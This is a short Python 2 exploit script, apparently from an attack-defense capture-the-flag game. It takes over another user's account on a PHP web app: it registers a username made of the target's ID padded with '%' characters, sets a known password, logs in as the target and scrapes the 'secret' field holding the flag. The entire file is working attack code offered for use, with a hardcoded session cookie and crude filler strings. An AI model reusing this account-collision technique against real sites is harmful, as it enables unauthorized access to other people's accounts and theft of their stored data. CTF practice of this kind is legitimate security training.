#!/usr/bin/env python
# -*- coding: utf-8 -*- 

import requests
import re
import sys

def exploit(ip, port, flag_id, image_path):
    image = {'profile_picture': open(image_path, 'rb')}
    username = flag_id + '%%%%%%%%%%%%%%%%'
    cookie = dict(PHPSESSID='a9njogb56kpcatsc6dtqbo5ab2')

    requests.post('http://%s:%d/index.php?page=register' % (ip, int(port)),
        data = {
            'firstname': 'John',
            'lastname': 'Doe',
            'username': username,
            'password': 'hunter2',
            'bio': 'Seduction Coach',
            'gender': 'M',
            'secret': 'EAT DA POOPOO',
            'action': 'register'
        },
        files = image, cookies = cookie)
    
    requests.post('http://%s:%d/index.php?page=editprofile' % (ip, int(port)),
        data = {
            'password': 'hunter2',
            'bio': 'Seduction Coach',
            'gender': 'M',
            'secret': 'EAT DA POOPOO',
            'action': 'editprofile'
        }, cookies = cookie)

    response = requests.post('http://%s:%d/index.php?page=login' % (ip, int(port)),
        data = {
            'username': flag_id,
            'password': 'hunter2',
            'action': 'login'
        })

    if response.status_code == requests.codes.ok:
        m = re.search(r'<div class="col-sm-9 secret">(.+)</div>', response.text)
        if m:
            return m.group(1)
        else:
            raise Exception('Flag not found')
    else:
        raise Exception('Error on remote page')


if __name__ == '__main__':
    print exploit(*sys.argv[1:])
